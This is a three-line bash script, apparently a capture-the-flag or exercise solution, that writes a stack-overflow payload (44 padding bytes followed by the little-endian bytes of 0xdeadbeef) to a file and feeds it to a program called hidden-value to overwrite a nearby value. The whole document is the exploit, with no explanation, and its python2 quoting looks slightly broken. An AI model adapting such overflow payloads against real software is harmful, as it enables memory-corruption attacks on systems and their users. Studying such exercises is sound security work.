#!/bin/bash
python2 -c print"'a' * 44 + '\xef\xbe\xad\xde'"> payload
./hidden-value < payload
